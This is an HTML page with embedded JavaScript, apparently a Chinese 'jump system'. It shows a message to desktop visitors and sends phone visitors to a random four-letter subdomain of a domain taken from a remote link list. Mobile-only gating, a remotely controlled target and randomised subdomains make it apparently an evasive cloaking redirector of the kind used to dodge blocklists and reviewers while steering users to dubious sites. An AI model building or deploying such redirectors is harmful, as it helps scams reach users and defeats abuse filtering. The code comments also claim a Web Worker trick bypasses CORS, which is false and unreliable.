<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>手机跳转系统</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .message {
            margin: 20px 0;
            padding: 15px;
            border-radius: 5px;
        }
        .success {
            background-color: #e6ffed;
            color: #1a7f37;
            border: 1px solid #a3d8b1;
        }
        .error {
            background-color: #ffebee;
            color: #c62828;
            border: 1px solid #ef9a9a;
        }
        .warning {
            background-color: #fff8e1;
            color: #ff8f00;
            border: 1px solid #ffe082;
        }
        #loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(0,0,0,.3);
            border-radius: 50%;
            border-top-color: #000;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .status-text {
            display: inline-block;
            vertical-align: middle;
        }
        button {
            padding: 8px 16px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>跳转系统</h1>
        <div id="status">
            <div id="loading"></div>
            <span class="status-text">正在检测设备并准备跳转...</span>
        </div>
    </div>

    <script>
        // 配置
        const TARGET_FILE = 'https://shop.ag.pgylxz302.me/1.txt';
        
        // 生成随机4字母子域名
        function generateRandomSubdomain() {
            const chars = 'abcdefghijklmnopqrstuvwxyz';
            return Array.from({length: 4}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
        }
        
        // 检测是否为移动设备
        function isMobileDevice() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }
        
        // 提取主域名
        function extractMainDomain(url) {
            try {
                // 处理URL格式
                let domain = url;
                if (!domain.startsWith('http')) {
                    domain = 'https://' + domain;
                }
                
                const domainObj = new URL(domain);
                let hostname = domainObj.hostname.replace('www.', '');
                
                // 提取主域名 (最后两部分)
                const parts = hostname.split('.');
                if (parts.length >= 2) {
                    return parts.slice(-2).join('.');
                }
                return hostname;
            } catch {
                return '';
            }
        }
        
        // 更新状态显示
        function updateStatus(type, message, targetUrl = '', showRetry = false) {
            const statusDiv = document.getElementById('status');
            const messages = {
                error: `
                    <div class="message error">
                        <h2>系统错误</h2>
                        <p>${message}</p>
                        ${showRetry ? '<button id="retry-btn">重试</button>' : ''}
                    </div>
                `,
                warning: `
                    <div class="message warning">
                        <h2>此链接仅限手机访问</h2>
                        <p>${message}</p>
                        ${targetUrl ? `<p>目标URL: <code>${targetUrl}</code></p>` : ''}
                    </div>
                `,
                success: `
                    <div class="message success">
                        <p>跳转中，请稍候...</p>
                        <p>目标URL: <code>${targetUrl}</code></p>
                    </div>
                `,
                loading: `
                    <div id="loading"></div>
                    <span class="status-text">${message}</span>
                `
            };
            statusDiv.innerHTML = messages[type] || '';
            
            if (showRetry) {
                document.getElementById('retry-btn')?.addEventListener('click', executeRedirect);
            }
        }
        
        // 使用Web Worker和Blob URL绕过CORS
        function fetchWithWorker(url) {
            return new Promise((resolve, reject) => {
                const workerCode = `
                    self.onmessage = async function(e) {
                        try {
                            const response = await fetch('${url}');
                            const text = await response.text();
                            self.postMessage({success: true, data: text});
                        } catch (error) {
                            self.postMessage({success: false, error: error.message});
                        }
                    };
                `;
                
                const blob = new Blob([workerCode], {type: 'application/javascript'});
                const workerUrl = URL.createObjectURL(blob);
                const worker = new Worker(workerUrl);
                
                worker.onmessage = function(e) {
                    if (e.data.success) {
                        resolve(e.data.data);
                    } else {
                        reject(new Error(e.data.error));
                    }
                    URL.revokeObjectURL(workerUrl);
                };
                
                worker.onerror = function(error) {
                    reject(error);
                    URL.revokeObjectURL(workerUrl);
                };
                
                worker.postMessage('start');
            });
        }
        
        // 使用Service Worker代理请求
        async function fetchWithServiceWorker(url) {
            return new Promise((resolve, reject) => {
                if (!('serviceWorker' in navigator)) {
                    reject(new Error('浏览器不支持Service Worker'));
                    return;
                }
                
                navigator.serviceWorker.register('/sw.js', {scope: '/'})
                    .then(registration => {
                        return navigator.serviceWorker.ready;
                    })
                    .then(() => {
                        return fetch(`/proxy?url=${encodeURIComponent(url)}`);
                    })
                    .then(response => response.text())
                    .then(resolve)
                    .catch(reject);
            });
        }
        
        // 主执行函数
        async function executeRedirect() {
            try {
                // 1. 检测设备类型
                if (!isMobileDevice()) {
                    updateStatus('warning', '请使用手机设备打开此链接');
                    return;
                }
                
                // 2. 尝试获取链接列表
                updateStatus('loading', '正在获取链接列表...');
                
                let text;
                try {
                    // 先尝试Web Worker方式
                    text = await fetchWithWorker(TARGET_FILE);
                } catch (e) {
                    console.warn('Web Worker方式失败:', e.message);
                    // 回退到Service Worker方式
                    try {
                        text = await fetchWithServiceWorker(TARGET_FILE);
                    } catch (e2) {
                        console.warn('Service Worker方式失败:', e2.message);
                        // 最后尝试直接fetch（可能会失败）
                        try {
                            const response = await fetch(TARGET_FILE);
                            text = await response.text();
                        } catch (e3) {
                            throw new Error('无法获取链接列表: 所有方式均失败');
                        }
                    }
                }
                
                if (!text) throw new Error('获取到的内容为空');
                console.log('获取到的内容:', text);
                
                const validLinks = text.split('\n')
                    .map(line => line.trim())
                    .filter(line => line && !line.startsWith('#'));
                
                if (!validLinks.length) throw new Error('没有可用的链接');
                
                // 3. 提取主域名并生成随机子域名
                const mainDomain = extractMainDomain(validLinks[0]);
                if (!mainDomain) throw new Error('无效的链接格式: '+validLinks[0]);
                
                const randomSub = generateRandomSubdomain();
                const targetUrl = `https://${randomSub}.${mainDomain}`;
                
                // 4. 显示跳转信息并执行跳转
                updateStatus('success', '', targetUrl);
                setTimeout(() => {
                    window.location.href = targetUrl;
                }, 1500);
                
            } catch (error) {
                updateStatus('error', error.message, '', true);
                console.error('跳转错误:', error);
            }
        }
        
        // 页面加载后执行
        document.addEventListener('DOMContentLoaded', executeRedirect);
    </script>
</body>
</html>